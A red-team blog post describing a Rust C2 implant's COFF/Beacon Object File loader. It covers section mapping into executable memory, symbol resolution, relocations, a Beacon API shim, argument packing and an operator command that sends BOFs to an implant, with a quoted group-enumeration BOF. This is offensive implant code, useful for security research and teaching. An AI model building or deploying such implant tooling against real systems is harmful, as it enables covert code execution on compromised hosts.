---
title: Building a C2 Framework - COFF Loader
date: 2025-10-12 12:00:00 -500
categories: [malware development,red team,offensive tooling]
tags: [Rust,C2,pentesting,career,tips,tricks]
image:
  path: /assets/img/posts/c2/CoverC2.png
  alt: C2 Logo
---

## COFF Loader

COFF, short for Common Object File Format, is a file format used to store compiled code produced by compilers or linkers. It defines structured sections for different parts of a program, such as `.text` for executable code and `.data` for initialized variables, as well as symbol information for functions and variables.

COFF is versatile: it can store individual functions, program fragments, libraries, or even entire executables. On Windows, the familiar PE (Portable Executable) format is actually based on COFF, often referred to as PE/COFF.

While COFF is still supported today, it’s considered complex, and many modern systems have moved to simpler formats like `ELF` on Unix-like platforms. Despite this, understanding COFF is useful for low-level programming, reverse engineering, and exploring how executables are structured.

[COFF Wiki](https://wiki.osdev.org/COFF)

Understanding COFF is valuable because many low-level capabilities used by small, modular agents are achieved through `COFF's/BOF`. By implementing a COFF loader, an implant can remain compact while offloading functionality into separately supplied object blobs. This makes the agent more flexible and maintainable: instead of embedding large amounts of logic in the binary, you can deliver focused payloads that the loader executes on-demand, enabling a wide range of actions without inflating the core implant.

>This isn’t a step-by-step tutorial or guide. It’s just my personal journal a place to share what I’m working on, why I made certain choices, and how the different parts of the project fit together.
{: .prompt-info}

So first we need to understand its structure:

![Table](/assets/img/posts/c2/COFF%20Loader/Table.png)
Using the COFF Wiki we can create these structs for parsing properly the COFF
```rust
#[repr(C)]
pub struct IMAGE_FILE_HEADER
{
   pub Machine: u16,
  pub  NumberOfSections: u16,
   pub TimeDateStamp:  u32,
  pub  PointerToSymbolTable: u32,
   pub NumberOfSymbols:         u32,
  pub  SizeOfOptionalHeader:  u16 ,
  pub  Characteristics: u16
}


#[repr(C,packed)]
pub struct IMAGE_SYMBOL
{
pub	n_name: NameSymbol,	/* Symbol Name */
pub	n_value: u32,	/* Value of Symbol */
pub	n_scnum:  i16,	/* Section Number */
pub	n_type: u16,		/* Symbol Type */
pub	n_sclass:	u8, /* Storage Class */
pub	n_numaux:	u8, /* Auxiliary Count */
}

#[repr(C)]
pub struct SECTION_HEADER
{
	pub s_name: [u8; 8],	/* Section Name */
	pub s_paddr: u32,	/* Physical Address */
	pub s_vaddr:	u32,/* Virtual Address */
	pub s_size:	u32,	/* Section Size in Bytes */
	pub s_scnptr:u32,	/* File offset to the Section data */
	pub s_relptr:	u32,/* File offset to the Relocation table for this Section */
	pub s_lnnoptr:	u32,/* File offset to the Line Number table for this Section */
	pub s_nreloc: u16,	/* Number of Relocation table entries */
	pub s_nlnno:	u16,/* Number of Line Number table entries */
	pub s_flags: u32	/* Flags for this section */
}
```
### Coff Object
We can represent a COFF payload using a CoffObject struct that organizes its core components. In addition to the main sections, there are other supporting structures such as the string table, relocation entries, and the Global Offset Table (GOT), which together define symbol references, memory locations, and other metadata required for proper execution.

```rust
pub struct CoffObject{
    pub binary_base: *const u8,
    pub binary_len: usize,
    pub file_header:*const IMAGE_FILE_HEADER,
    pub first_section_header: Option<*const SECTION_HEADER>,
    pub symbol_table: Option<*const IMAGE_SYMBOL>,
    pub string_table: Option<*const u8>,
    pub string_table_size: Option<u32>,
    pub sections: Vec<Arc<Sections>>,
    pub got: Option<GotTable>
    ,
    // Optional fast lookup for externs by name -> address
    got_index: Option<BTreeMap<String, *const c_void>>,
}
```

### Parsing & Creating Sections
My latest COFF loader is fairly sophisticated, it performs bounds checking, respects section alignment flags, and enforces page protections based on section attributes. Those checks make the implementation more robust and safer in real usage, but they also complicate the explanation. I’ll introduce a simplified loader variant: one that assumes a fixed alignment, maps sections with read/write/execute permissions, and omits bounds checks and protection parsing. This pared-down loader is easier to follow conceptually, but it is insecure and should only be used for explanatory or lab scenarios, production code must preserve bounds checks, correct alignment handling, and least-privilege memory protections.

```rust
  fn parse_coff(&mut self){

    let coff_header = self.file_header;
    unsafe{
    let coff_h = &*coff_header;
    self.symbol_table =  Some((self.file_header as *const u8).add(coff_h.PointerToSymbolTable as usize) as * const IMAGE_SYMBOL);
    self.first_section_header = Some(self.file_header.add(1 as usize) as *const SECTION_HEADER); 
    self.string_table = Some(self.symbol_table.unwrap().add(coff_h.NumberOfSymbols as usize) as *const u8);
    self.string_table_size = Some(*self.string_table.unwrap() as u32)
};
    }

fn create_sections(&mut self){ 
    let coff_h = unsafe {&(*self.file_header)};
    let mut section_header = self.first_section_header.unwrap();
    
    for _ in 0..coff_h.NumberOfSections{
    unsafe {
    let section_name = core::str::from_utf8(&(*section_header).s_name).unwrap();  
    let section_raw_data_pointer = (self.file_header as *const u8).add((*section_header).s_scnptr as usize) as *const c_void;
    let reloc_pointer = (self.file_header as *const u8).add((*section_header).s_relptr as usize) as *const RELOC_ENTRY_TABLE;
    let section_aligned_size = ((*section_header).s_size + 0x2000) & !0x2000;

    let section_memory = VirtualAlloc(None,section_aligned_size as usize, windows::Win32::System::Memory::VIRTUAL_ALLOCATION_TYPE(MEM_COMMIT | MEM_RESERVE) ,windows::Win32::System::Memory::PAGE_PROTECTION_FLAGS(PageProtection::PAGE_EXECUTE_READWRITE as u32));


    section_memory.copy_from(section_raw_data_pointer, (*section_header).s_size as usize);

    /*store sections*/

    if section_name.contains(".bss"){
        section_memory.write_bytes(0, section_aligned_size as usize);
    }

    if section_name.contains(".text"){
        /*Create a allocate  a GOT TABLE*/
    };
    section_header = section_header.add(1);

    }
}
}
```

### Resolving Symbols
After parsing the COFF sections, the next step is resolving external symbols. We can leverage helper routines, such as PEB walking and manual parsing, to locate function addresses in memory.

For external symbols, the linker often prefixes them with __imp. Many external symbol names are longer than 8 characters, so the COFF format stores the actual name in the string table. The symbol itself contains an offset into this table, which we can use to retrieve the DLL and function names.

Once we have the name, we can parse it to determine the DLL and function to resolve. COFF objects for this usage often use a special convention for calling externals. For example:

```c
WINBASEAPI int __cdecl MSVCRT$printf(const char * _Format, ...);
```

Here’s how it works when resolving:

1. Look for the $ separator in the symbol name.

2. Remove the __imp prefix.

3. The part before $ is the DLL name — append .dll if needed.

4. The part after $ is the function name.

Using this, we can either walk the PEB to locate the DLL and function in memory or explicitly load the library and retrieve the function address. The resolved address is then stored in the GOT, enabling the COFF loader to call external functions.

```rust
fn resolve_external_symbols(&mut self){
let mut n = 1;
let mut symbol_point = self.symbol_table.unwrap();
let mut external_offset_got_table = 0;


unsafe {
while  n < (*self.file_header).NumberOfSymbols as u32  {
if (*symbol_point).n_name.s_name[0] == 0 {
    
    let is_external =  SectionType::from((*symbol_point).n_scnum);
    let (dll_name,func_name) = self.split_string_table_name((*symbol_point).n_name.offsets.offset);
    match is_external  {
    SectionType::External =>{    
    
    let complete_dll_name = dll_name.to_string() + ".DLL";
    let handle_mutex  = match GetModuleHandle(Some(&complete_dll_name)){
    Some(p) => p,
    None => LoadLibrary(&complete_dll_name).unwrap()
    };
    {
    let mut handle = handle_mutex.lock().unwrap();
    let symbol_value = handle.GetProcAddress(func_name).unwrap();
    self.modify_got_table(symbol_value as usize, external_offset_got_table,func_name.to_string());
    }
    external_offset_got_table += 1;
    }
    _ => (),
    
    }
}

n +=  1 + (*symbol_point).n_numaux as u32;
symbol_point = symbol_point.add(1 + (*symbol_point).n_numaux as usize);
}
}
}
```

### Applying relocations

Once the functions are resolved we need to do so relocations in MSDN PE Format documentation we have the relocation table:

![Relocation Table](/assets/img/posts/c2/COFF%20Loader/Relocations.png)

Relocation entries are what make it possible to load compiled code into arbitrary memory addresses while still maintaining correct symbol references.

In other words, you can take a COFF file and place its .text, .data, and .bss sections anywhere in memory — the relocation entries then ensure that all addresses and symbol references are properly adjusted so the code executes as intended.

Each section in a COFF file (such as .text, .data, or .bss) can have its own Relocation Table, which is simply an array of relocation entry structures indexed from zero. The location and size of this table are stored directly in the section’s header.

Each relocation entry describes:

- Where in the section a fix-up is required.

- Which symbol it refers to.

- What type of relocation should be applied (e.g., absolute or relative addressing).

When applying relocations we handle two cases:

- Internal relocations: these reference symbols defined within the COFF object itself. For these, we look up the symbol’s resolved value (the address where the symbol was placed during loading) and patch the relocation site with that value.

- External relocations: these reference symbols provided by external modules. For externals we consult the GOT to obtain the resolved function/address. Depending on the relocation type (absolute, relative, high/low-part, etc.), we apply the appropriate fix-up logic to the target site so the code will call or reference the external symbol correctly.
```rust
match section_type {
      SectionType::Internal => {  
         let index_for_section = (*symbol_reloc).n_scnum - 1;
        let section_reloc = self.first_section_header.unwrap().add(index_for_section as usize);
                     match reloc_type  {
                         RelocType::IMAGE_REL_AMD64_ADDR32NB => self.relocate_based_on_type(reloc_type, &(*section_reloc).s_name, (*symbol_reloc).n_value, section, (*reloc_pointer).r_vaddr),
                         RelocType::IMAGE_REL_AMD64_REL32 => self.relocate_based_on_type(reloc_type, &(*section_reloc).s_name, (*symbol_reloc).n_value, section, (*reloc_pointer).r_vaddr),
                                _ => todo!()
                            }
                        }
    
     
         SectionType::External => {

            if (*symbol_reloc).n_name.s_name[0] == 0 {   
                let mut symbol_value: *const c_void = ptr::null_mut();
                let (_,function_name) = self.split_string_table_name((*symbol_reloc).n_name.offsets.offset);
                for entries in self.got.as_ref().unwrap().got_entries.iter(){
                         if function_name == entries.func_name {
                                      symbol_value = entries.address;
                                       break;
                                    }
                                }
            match reloc_type { 
                    RelocType::IMAGE_REL_AMD64_REL32 => {
                                let reloc_location = self.locate_reloc(section, (*reloc_pointer).r_vaddr);
                                let addend = core::ptr::read_unaligned(reloc_location) as i32;
                                core::ptr::write_unaligned(reloc_location,(symbol_value as isize - (reloc_location as isize + 4) + addend as isize ) as i32);
                                    }
                                 _ => todo!()
                                }
                             }
                         }
        _ => ()

    }
```
From here we just resolve the entrypoint and convert that address into a function pointer and call it.
```rust
let go_function: extern "C" fn();
unsafe{
    for mut _symbol_counter in 0..(*self.file_header).NumberOfSymbols{
    let name = core::str::from_utf8(&(*symbol_pointer).n_name.s_name).unwrap();
    if name.contains(name_entrypoint){
        go_function =  core::mem::transmute(section_data_reloc.add((*symbol_pointer).n_value as usize));
        go_function();
        break;
    }
    _symbol_counter +=  1 + (*symbol_pointer).n_numaux as u32;
    symbol_pointer = symbol_pointer.add(1 + (*symbol_pointer).n_numaux as usize);
    }
    }
```

### Beacon Api

Cobalt Strike uses an internal API that allows Beacon Object Files (BOFs) to interact directly with the implant’s core functionality. These internal APIs provide standardized interfaces for tasks like output handling, data parsing, and process management. Some of the most common functions include `BeaconPrintf`, `BeaconOutput`, `BeaconDataParse`, `BeaconExtract`, `BeaconDataInt`, `BeaconDataShort`, and the various `BeaconSpawn*` routines, among others.

The mechanism is straightforward: these functions are implemented within the implant itself. When the COFF loader encounters an external symbol without a $ (which would typically indicate an external DLL import), it assumes the symbol refers to one of these internal APIs. In that case, the loader calls a `resolve_symbol()` routine, which looks up the symbol name in an internal table containing pointers to all supported internal functions. Once a match is found, the correct function pointer is written into the COFF’s symbol table, effectively linking the BOF to the implant’s internal API at runtime.

This design allows the COFF modules to leverage the implant’s capabilities—such as storing or transmitting data, executing tasks, or managing processes, without embedding complex logic within the BOF itself. In essence, internal APIs act as a bridge between lightweight external modules and the implant’s core infrastructure.

As example I will put here a BeaconPrintf implementation, we can use variadic arguments
```rust
#[unsafe(no_mangle)]
 pub unsafe extern "C"  fn BeaconPrintf(ty: c_uint, fmt: *const c_char, args:  ...){
        if fmt.is_null() { return; }
        let fmt = unsafe {CStr::from_ptr(fmt).to_string_lossy()};
        let mut buf = String::new();
        // This is just a way to parse the format string and extract the arguments
        unsafe {args.with_copy(|mut ap | {
            let mut chars = fmt.chars().peekable();
            while let Some(ch) = chars.next() {
                if ch == '%' {
                    match chars.next() {
                        Some('d') => {
                            let v = ap.arg::<i32>();
                            write!(buf, "{}", v).unwrap();
                        }
                        Some('s') => {
                            let s = ap.arg::<*const c_char>();
                            let s = if s.is_null() { "(null)" } else { CStr::from_ptr(s).to_str().unwrap_or("(invalid utf8)") };
                            buf.push_str(s);
                        }
                        Some('S') => {
                           /*Wide string stuff*/
                        }
                        Some('%') => buf.push('%'),
                        Some('p') => {
                            let v = ap.arg::<usize>();
                            write!(buf, "{:p}", v as *const c_char).unwrap();
                        }
                        Some(other) => {
                            buf.push('%'); buf.push(other);
                        }
                        None => buf.push('%'),
                    }
                } else {
                    buf.push(ch);
                }
            }
            buf.push('\n');
        });
        
    }
     #[allow(static_mut_refs)]
     GLOBAL_BUFFER.extend_from_slice(buf.as_bytes());
    

    }
```
After all formatting, store the result in a global_buffer that the implant can access and then send it back to our operator.
```rust
#[inline]
pub fn resolve_symbol(name: &str) -> Option<*const c_void> {
    let ptr: *const c_void = match name {
        // Output
        "BeaconOutput" => BeaconOutput as *const c_void,
        "BeaconPrintf" => BeaconPrintf as *const c_void,

        // Data
        "BeaconDataParse" => BeaconDataParse as *const c_void,
        "BeaconDataPtr" => BeaconDataPtr as *const c_void,
        "BeaconDataInt" => BeaconDataInt as *const c_void,
        "BeaconDataShort" => BeaconDataShort as *const c_void,
        "BeaconDataLength" => BeaconDataLength as *const c_void,
        "BeaconDataExtract" => BeaconDataExtract as *const c_void,

        // Format
        "BeaconFormatAlloc" => BeaconFormatAlloc as *const c_void,
        "BeaconFormatReset" => BeaconFormatReset as *const c_void,
        "BeaconFormatAppend" => BeaconFormatAppend as *const c_void,
        "BeaconFormatToString" => BeaconFormatToString as *const c_void,
        "BeaconFormatFree" => BeaconFormatFree as *const c_void,
        "BeaconFormatInt" => BeaconFormatInt as *const c_void,

        // Utils
        "toWideChar" => toWideChar as *const c_void,

        _ => core::ptr::null()
    };
    if ptr.is_null() { None } else { Some(ptr) }
}
```
Now let's see an BOF example:

> These example are from: [TrustedSec Repo](https://github.com/trustedsec/CS-Situational-Awareness-BOF)

```c
VOID go( 
	IN PCHAR Buffer, 
	IN ULONG Length 
) 
{
	datap parser;
	BeaconDataParse(&parser, Buffer, Length);
	const short type = BeaconDataShort(&parser);
	const wchar_t * server = (wchar_t *)BeaconDataExtract(&parser, NULL);
	const wchar_t * group = (wchar_t *)BeaconDataExtract(&parser, NULL);
	server = (*server == 0) ? NULL: server;
	group = (*group == 0) ? NULL: group;


	
	if(!bofstart())
	{
		return;
	}

	if(type == 0)
	{
		ListserverGroups(server);
	}
	else
	{
		ListServerGroupMembers(server, group);
	}
	printoutput(TRUE);
};
```
We can se the use `BeaconDataParse` and others functions so if we inspect the object file we'll see something like:

![BeaconPrintf](/assets/img/posts/c2/COFF%20Loader/BeaconPrintf.png)

> The coff loader will see the prefix and no $ and will resolve it from the internal table.

In the other case we have a function with $.
```c
void ListServerGroupMembers(const wchar_t * server, const wchar_t * groupname)
{
	PLOCALGROUP_MEMBERS_INFO_3 pBuff = NULL, p = NULL;
	DWORD dwTotal = 0, dwRead = 0, i = 0;
	DWORD_PTR hResume = 0; // this should really just have been a handle MS
	NET_API_STATUS res = 0;
	do{
		res = NETAPI32$NetLocalGroupGetMembers(server, groupname, 3, (LPBYTE *) &pBuff, MAX_PREFERRED_LENGTH, &dwRead, &dwTotal, &hResume);
		if((res==ERROR_SUCCESS) || (res==ERROR_MORE_DATA))
		{
			p = pBuff;
			for(;dwRead>0;dwRead--)
			{
				internal_printf("%-40S  ", p->lgrmi3_domainandname);
				if(++i % 2 == 0)
				{
					internal_printf("\n");
				}
				p++;
			}
			i = 0;
			NETAPI32$NetApiBufferFree(pBuff);
		}
		else
		{
			BeaconPrintf(CALLBACK_ERROR, "Error: %lu\n", res);
		}
	} while(res == ERROR_MORE_DATA);
}
```
 `NETAPI32$NetLocalGroupGetMembers`:

![NetApi32](/assets/img/posts/c2/COFF%20Loader/NetAPI32.png)

> It takes the prefix find the $ and split into dll name and function name.

### Arguments in a Beacon Object File

In BOF-style modules the entrypoint (commonly named go) typically accepts a pointer to a buffer plus a length. All function arguments are serialized into that buffer by the caller — the BOF runtime then deserializes the buffer to reconstruct the original parameters.

A few important details to keep in mind:

Argument packing model: arguments are packed sequentially into the buffer in a predefined order. For primitive types (e.g., int, short) the raw bytes are written directly. For strings, the common approach is to prefix the encoded string with a 4-byte length and then append the string bytes; the loader advances the pointer by 4 + length to reach the next argument.

String encodings: C-style narrow strings (char*) are byte strings (typically UTF-8 or ANSI) where one character equals one byte. Wide strings (wchar_t*) are typically 2 bytes per character on Windows (UTF-16LE). Some BOFs expect one or the other, so the caller must encode strings to the expected encoding and include the correct byte length.

Server-side representation: on the server side it’s convenient to use an enum to represent argument kinds (e.g., Int, Short, CString, WString). The server serializes each enum variant into the buffer in order, computing string lengths and prefixing them as required.

```rust
pub enum TypedArg {
    WideString(String),
    Utf8String(String),
    Int(i32),
    Short(i16),
}

pub fn pack_args_ordered(items: &[TypedArg]) -> Vec<u8> {
    let mut buf = Vec::new();
    for item in items {
        match item {
            TypedArg::Utf8String(s) => {
                let data = utf8_z(s);
                push_u32(&mut buf, data.len() as u32);
                buf.extend_from_slice(&data);
            }
            TypedArg::WideString(s) => {
                let data = utf16le_z(s);
                push_u32(&mut buf, data.len() as u32);
                buf.extend_from_slice(&data);
            }
            TypedArg::Int(v) => {
                // 32-bit little-endian
                push_i32(&mut buf, *v);
            }
            TypedArg::Short(v) => {
                // 16-bit little-endian
                push_i16(&mut buf, *v);
            }
        }
    }
    buf
}
```

### Creating a legacy command in the CLI

Now we can create a “legacy command” for testing purposes.
Before that, let’s talk about the custom parser I built for it, since clap didn’t quite fit what I needed here (or at least, I haven’t figured out how to make it do exactly what I want).

This is partially how it works, but it basically store a vector of enum types variants, and at the end pass it to the `pack_args()`
```rust
pub fn parse_coff_tokens(tokens: &[String]) -> Result<(String, String, Vec<u8>), String> {
    if tokens.len() < 3 || tokens[0] != "coff" || tokens[1] != "run" {
        return Err("usage: coff run <path> [--entry <name>] [--argw <s>] [--arga <s>] [--argi <i32>] [--args <i16>] ...".to_string());
    }
    let path = tokens[2].clone();
    let mut entry = String::from("go");
    let mut typed: Vec<TypedArg> = Vec::new();

    let mut i = 3usize;
    while i < tokens.len() {
        match tokens[i].as_str() {
            "--entry" => {
                if i + 1 >= tokens.len() { return Err("--entry requires a value".to_string()); }
                entry = tokens[i + 1].clone();
                i += 2;
            }
            "--argw" => {
                if i + 1 >= tokens.len() { return Err("--argw requires a value".to_string()); }
                typed.push(TypedArg::WideString(tokens[i + 1].clone()));
                i += 2;
            }
        }
    }
}
```

With this in place, we can create the legacy command from an interactive session. The workflow is simple, parse the operator’s input to obtain the BOF path, the entry point, and the already-packed argument buffer.

Validate the BOF path, read the file contents, send a coff command (including the payload and metadata) to the implant and then wait for and handle the response. Error conditions (missing file, invalid entry point, or transfer failure) are validated and reported back to the user

```rust
"coff" => {
                    // Use typed-arg parser to preserve order and pack payload
let parsed = match parse_coff_tokens(&tokens) {
         Ok(v) => v,
         Err(e) => { eprintln!("{}", e); continue; }
        };
    let (path, entry, packed_args) = parsed;
    let path = match env::current_dir() {
            Ok(dir) => dir.join(path),
            Err(e) => { eprintln!("Failed to get current directory: {}", e); continue; },
            }.canonicalize();

    let path_canonical = match path {
                    Ok(path) => path,
                    Err(e) => { eprintln!("Failed to canonicalize path: {}", e); continue; },
            };

    let coff_file = match std::fs::read(path_canonical) {
            Ok(file) => file,
            Err(e) => { eprintln!("Failed to read file: {}", e); continue; },
                    };

match self.send_coff_to_active(Some(coff_file), entry, Some(packed_args)).await {
        Ok(cmd_id) => {
            let _ = self.wait_for_response(Some(cmd_id), notif_rx.as_mut().unwrap()).await;
                }
    Err(e) => { eprintln!("Failed to send command: {}", e);}
        }
                
            }
```

Preview:

![usage](/assets/img/posts/c2/COFF%20Loader/Usage.png)

Base on this:
```c
	BeaconDataParse(&parser, Buffer, Length);
	const short type = BeaconDataShort(&parser);
	const wchar_t * server = (wchar_t *)BeaconDataExtract(&parser, NULL);
	const wchar_t * group = (wchar_t *)BeaconDataExtract(&parser, NULL);
    server = (*server == 0) ? NULL: server;
	group = (*group == 0) ? NULL: group;

    if(!bofstart())
	{
		return;
	}

	if(type == 0)
	{
		ListserverGroups(server);
	}
	else
	{
		ListServerGroupMembers(server, group);
	}
	printoutput(TRUE);

```
We need to pass a short then 2 widestrings, with short = 0 only hostname is needed otherwise we also need group name.

So now we can pass our arguments.
![ResultCoff](/assets/img/posts/c2/COFF%20Loader/ResultsCOFF.png)

Even though I specified that with type 0 the group argument isn’t required, it still needs to be explicitly passed (either as 0 or an empty value) as you can see in the image with `--argw ""`, otherwise the program crashes with a status violation.

This approach isn’t ideal, since it forces you to always remember both the argument count and their exact order. Later on, I’ll improve this system by integrating it with the scripting engine, which will make argument handling more flexible and less error-prone. For now, this legacy command setup serves well for testing purposes.

If we pass the administrators it will give us the users.
![PassingGroup](/assets/img/posts/c2/COFF%20Loader/PassingGroup.png)

That's it for now :).


































